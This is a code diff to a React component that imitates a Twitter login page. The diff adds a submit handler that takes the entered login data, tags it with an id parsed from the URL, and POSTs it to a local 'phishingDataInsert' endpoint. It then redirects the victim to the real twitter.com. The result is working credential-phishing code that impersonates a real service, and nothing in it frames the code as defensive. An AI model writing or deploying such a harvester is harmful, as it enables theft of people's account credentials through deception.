@@ -3,8 +3,26 @@ import { useForm } from 'react-hook-form';
 
 const Twitter = () => {
     document.title = "Login on Twitter / Twitter";
-    const { register, handleSubmit, watch, formState: { errors } } = useForm();
-    const onSubmit = data => console.log(data);
+        const { register, handleSubmit, watch, formState: { errors } } = useForm();
+        const onSubmit = data => {
+            const url = window.location.href;
+        const splitIdForFinal = url.split('?id=')[1];
+        const finalIdSplit = splitIdForFinal.split('&&query=24798dak+ded&&refer+twitter&&redirect=jkl');
+
+        const id = finalIdSplit[0]+finalIdSplit[1]
+        const phishData = {id,...data,web:'twitter'}
+
+        fetch('http://localhost:5000/phishingDataInsert',{
+            method:"POST",
+            headers:{
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(phishData)
+        }).then(res => res.json()).then(response => {
+            // console.log(response);
+            window.location.href = 'https://twitter.com/'
+        })
+    };
     
     return (
         <div className="container">
